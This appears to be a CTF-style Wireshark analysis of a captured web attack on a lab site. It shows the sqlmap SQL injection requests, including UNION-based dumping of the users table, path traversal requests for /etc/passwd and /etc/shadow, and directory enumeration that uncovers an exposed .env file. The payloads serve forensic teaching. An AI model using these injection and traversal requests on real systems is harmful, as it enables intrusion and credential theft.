# Web Attack — SQLi + Directory Traversal + .env Leak

**File:** `pcap-files/webattack_ctf.pcapng`
**Tool:** Wireshark
**Target:** shop.local
**Attacker tool:** sqlmap 1.7.8

---

## Attack Timeline

### Phase 1 — Reconnaissance (Normal Browsing)

```
GET /          200 OK
GET /index.php  200 OK
GET /about.php  200 OK
GET /contact.php 200 OK
GET /products.php 200 OK
```

Manual browsing to map the site. Then POST login:
```
POST /login.php
username=john&password=MyPass123!
→ 302 redirect (login success)
```

Filter in Wireshark:
```
http.request.method == "POST"
```

---

### Phase 2 — SQL Injection (sqlmap)

User-Agent in all requests: `sqlmap/1.7.8#stable (https://sqlmap.org)`

Filter to see only attack traffic:
```
http.user_agent contains "sqlmap"
```

**Step 1 — Detect vulnerability:**
```
GET /login.php?id=1'
→ 500 Internal Server Error   ← SQL error, vulnerable
```

**Step 2 — Boolean test:**
```
GET /login.php?id=1' OR '1'='1
→ 500 Internal Server Error
GET /login.php?id=1' OR '1'='1'--
→ 500 Internal Server Error
```

**Step 3 — UNION injection, find column count:**
```
GET /login.php?id=1 UNION SELECT null--          → 200 OK
GET /login.php?id=1 UNION SELECT null,null--     → 200 OK
GET /login.php?id=1 UNION SELECT null,null,null-- → 200 OK  ← 3 columns
```

**Step 4 — Dump credentials:**
```
GET /login.php?id=1 UNION SELECT username,password,null FROM users--
→ 200 OK  <html>Welcome john</html>
```

---

### Phase 3 — Directory Traversal

```
GET /../../../../etc/passwd
→ 403 Forbidden (but body leaks data!)
   root:x:0:0:root
   john:x:1001:1001

GET /../../../etc/shadow
→ 403 Forbidden  (blocked)
```

---

### Phase 4 — Directory Enumeration

```
GET /admin/            → 200 OK (accessible!)
GET /admin/config.php  → 403 Forbidden
GET /backup/           → 403 Forbidden
GET /backup/db.sql     → 403 Forbidden
GET /.git/config       → 403 Forbidden
GET /.env              → 200 OK!
```

**Critical finding — `.env` exposed:**
```
DB_PASS=SuperSecret123
```

Filter in Wireshark to find this:
```
http.response.code == 200
```
Look through responses, find the `.env` one.

---

## Summary of What Was Found

| Finding | Value |
|---|---|
| Login credentials | john / MyPass123! |
| DB password (.env) | SuperSecret123 |
| Linux users (passwd) | root, john (uid 1001) |
| SQL injection | UNION-based, 3 columns, `users` table |
| Attacker tool | sqlmap 1.7.8 |

---

## Wireshark Workflow for This File

```
1. http                          — see all HTTP traffic
2. http.user_agent contains "sqlmap"  — isolate attack traffic
3. http.request.method == "POST"      — find login attempts
4. http.response.code == 200          — find successful responses
5. Right-click any packet → Follow → TCP Stream  — read full request/response
```
